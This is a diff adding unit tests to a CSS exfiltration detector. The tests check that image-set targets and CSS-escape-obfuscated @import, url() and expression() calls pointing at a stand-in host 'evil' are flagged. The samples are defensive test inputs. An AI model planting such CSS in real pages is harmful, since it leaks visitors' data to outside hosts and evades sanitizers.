@@ -60,6 +60,16 @@ describe('gate — CSS exfil (#616 T-CSS)', () => {
   test('ignores dangerous constructs inside comments', () => {
     assert.equal(findCssExfil('/* @import "x"; url(//evil) */ a{color:var(--t)}').length, 0);
   });
+  test('catches image-set() bare-string remote targets (no url() wrapper)', () => {
+    assert.deepEqual(findCssExfil('a{background:image-set("//evil/leak" 1x)}').map(f => f.rule), ['css-url-remote']);
+    assert.deepEqual(findCssExfil('a{background:-webkit-image-set("https://evil/x" 2x)}').map(f => f.rule), ['css-url-remote']);
+    assert.equal(findCssExfil('a{background:image-set("data:image/png;base64,AAAA" 1x)}').length, 0);
+  });
+  test('decodes CSS escapes so an obfuscated keyword/url cannot dodge the gate', () => {
+    assert.ok(findCssExfil('@imp\\ort "//evil"').some(f => f.rule === 'css-import'));
+    assert.ok(findCssExfil('a{background:\\75rl(//evil)}').some(f => f.rule === 'css-url-remote'));
+    assert.ok(findCssExfil('a{b:expre\\73sion(alert(1))}').some(f => f.rule === 'css-expression'));
+  });
   test('gateCss surfaces a remote url() as a blocking error', () => {
     const r = gateCss('section.foo{background:url(//evil/?leak)}', 'foo');
     assert.equal(r.ok, false);
